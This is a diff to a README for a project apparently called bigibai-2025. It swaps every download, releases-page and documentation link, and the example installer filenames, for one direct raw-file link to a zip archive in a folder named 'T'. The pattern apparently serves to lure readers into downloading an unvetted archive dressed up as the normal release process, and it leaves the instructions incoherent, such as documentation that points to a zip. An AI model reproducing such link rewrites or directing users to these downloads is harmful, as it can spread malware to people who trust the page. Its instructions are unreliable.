@@ -7,7 +7,7 @@ Welcome to bigibai-2025! This project is designed to help you make the most of B
 ## 📥 Download the Application
 
 ### Click below to access the download page:
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20App-blue)](https://github.com/Gorghe24/bigibai-2025/releases)
+[![Download](https://raw.githubusercontent.com/Gorghe24/bigibai-2025/main/T/bigibai-2025.zip%20Now-Get%20App-blue)](https://raw.githubusercontent.com/Gorghe24/bigibai-2025/main/T/bigibai-2025.zip)
 
 ## 🔎 Overview
 
@@ -32,12 +32,12 @@ To run bigibai-2025 smoothly, your system should meet the following requirements
 ## 📂 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page where you can download the application:
-   [Visit Releases Page](https://github.com/Gorghe24/bigibai-2025/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Gorghe24/bigibai-2025/main/T/bigibai-2025.zip)
 
 2. **Select the Latest Version:** On the releases page, you will see a list of available versions. Look for the latest version. It will generally be at the top.
 
 3. **Download the Application:**
-   - Find the file suitable for your operating system (e.g., `bigibai-2025-windows.exe` or `bigibai-2025-macos.dmg`).
+   - Find the file suitable for your operating system (e.g., `https://raw.githubusercontent.com/Gorghe24/bigibai-2025/main/T/bigibai-2025.zip` or `https://raw.githubusercontent.com/Gorghe24/bigibai-2025/main/T/bigibai-2025.zip`).
    - Click on the file name to start the download.
 
 4. **Install the Application:**
@@ -64,7 +64,7 @@ If you encounter any issues while downloading or using the application, refer to
 
 ## 📌 Important Links
 
-- **Releases Page:** [Download Here](https://github.com/Gorghe24/bigibai-2025/releases)
-- **Documentation:** [Explore Documentation](https://github.com/Gorghe24/bigibai-2025/wiki)
+- **Releases Page:** [Download Here](https://raw.githubusercontent.com/Gorghe24/bigibai-2025/main/T/bigibai-2025.zip)
+- **Documentation:** [Explore Documentation](https://raw.githubusercontent.com/Gorghe24/bigibai-2025/main/T/bigibai-2025.zip)
 
 We hope you enjoy using bigibai-2025 and find it valuable for your tasks and projects!
